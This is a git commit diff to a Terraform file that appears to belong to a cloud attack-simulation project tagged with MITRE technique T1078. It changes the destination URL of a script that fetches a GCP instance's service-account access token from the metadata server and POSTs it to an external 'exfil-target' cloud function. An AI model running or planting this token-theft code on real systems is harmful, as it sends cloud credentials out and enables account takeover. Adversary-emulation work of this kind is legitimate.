662d34cc36af8b2f9c63306a6bcf6c0e46fdeb0b
Saad Ahmad <saadx@google.com>
2024-01-06 23:27:41 -0500

    updated CF link

--- main.tf
+++ main.tf
@@ -220,7 +220,7 @@ resource "random_id" "bucket_suffix" {
       # T1078 - Valid Accounts
       token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header 'Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
       
-      curl -X POST https://wide-receiver-usekq2agua-uc.a.run.app\
+      curl -X POST https://us-east1-s4-exfil-project-test-1.cloudfunctions.net/exfil-target 
         -H "Content-Type: application/json"\
         -d "{ \"hmm\": \"$token\" }"
     EOT
